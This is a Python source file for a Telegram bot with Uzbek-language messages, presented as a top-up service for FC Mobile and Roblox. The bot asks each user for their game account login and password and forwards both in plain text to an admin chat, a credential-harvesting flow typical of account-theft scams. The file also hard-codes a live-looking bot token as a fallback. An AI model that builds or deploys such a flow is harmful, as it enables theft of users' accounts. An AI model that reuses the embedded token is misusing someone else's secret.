import asyncio
import logging
import os
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import CommandStart
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# --- KONFIGURATSIYA ---
# Tokenni xavfsiz holatda Server Muhitidan (Environment Variable) olamiz.
TOKEN = os.getenv("BOT_TOKEN", "8762818454:AAFm6BlEd2ijfiZ7BvHGr7U152c8jzaE07M")
ADMINS = [6225462652]  # Admin Telegram ID si

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# --- HOLATLAR (FSM) ---
class OrderState(StatesGroup):
    choosing_game = State()
    entering_login = State()
    entering_password = State()
    choosing_amount = State()

# --- TUGMALAR ---
main_menu = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="🎮 Donat qilish")],
        [KeyboardButton(text="💰 Balansni tekshirish")]
    ],
    resize_keyboard=True
)

game_menu = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="⚽️ FC Mobile"), KeyboardButton(text="🏗 Roblox")],
        [KeyboardButton(text="🔙 Asosiy menu")]
    ],
    resize_keyboard=True
)

# --- BOT HANDLERS ---
@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer("Salom! Xush kelibsiz. Donat qilish uchun pastdagi tugmani bosing.", reply_markup=main_menu)

@dp.message(F.text == "🎮 Donat qilish")
async def start_order(message: Message, state: FSMContext):
    await message.answer("O'yinni tanlang:", reply_markup=game_menu)
    await state.set_state(OrderState.choosing_game)

@dp.message(OrderState.choosing_game, F.text.in_(["⚽️ FC Mobile", "🏗 Roblox"]))
async def choose_game(message: Message, state: FSMContext):
    await state.update_data(game=message.text)
    await message.answer("Iltimos, akkaunt loginingizni (email yoki username) yuboring:", reply_markup=ReplyKeyboardRemove())
    await state.set_state(OrderState.entering_login)

@dp.message(OrderState.choosing_game, F.text == "🔙 Asosiy menu")
@dp.message(F.text == "🔙 Asosiy menu")
async def go_home(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("Asosiy menu:", reply_markup=main_menu)

@dp.message(OrderState.entering_login)
async def enter_login(message: Message, state: FSMContext):
    await state.update_data(login=message.text)
    await message.answer("Endi parolni yuboring:")
    await state.set_state(OrderState.entering_password)

@dp.message(OrderState.entering_password)
async def enter_password(message: Message, state: FSMContext):
    await state.update_data(password=message.text)
    await message.answer("Qancha miqdorda kerak? (yoki paket nomini yozing):")
    await state.set_state(OrderState.choosing_amount)

@dp.message(OrderState.choosing_amount)
async def finish_order(message: Message, state: FSMContext):
    data = await state.get_data()
    username = f"@{message.from_user.username}" if message.from_user.username else "Username yo'q"
    
    order_text = (
        f"📩 <b>Yangi buyurtma!</b>\n\n"
        f"👤 Foydalanuvchi: {username}\n"
        f"🎮 O'yin: {data.get('game')}\n"
        f"🆔 Login: <code>{data.get('login')}</code>\n"
        f"🔑 Parol: <code>{data.get('password')}</code>\n"
        f"📦 Miqdor: {message.text}"
    )
    
    # Barcha adminlarga xabar yuborish
    for admin_id in ADMINS:
        try:
            await bot.send_message(chat_id=admin_id, text=order_text, parse_mode="HTML")
        except Exception as e:
            logging.error(f"Adminga xabar yuborishda xatolik ({admin_id}): {e}")

    await message.answer("Buyurtmangiz qabul qilindi! Adminlarimiz tez orada bajarishadi.", reply_markup=main_menu)
    await state.clear()

async def main():
    # Eski to'planib qolgan buyruqlarni o'chirish
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
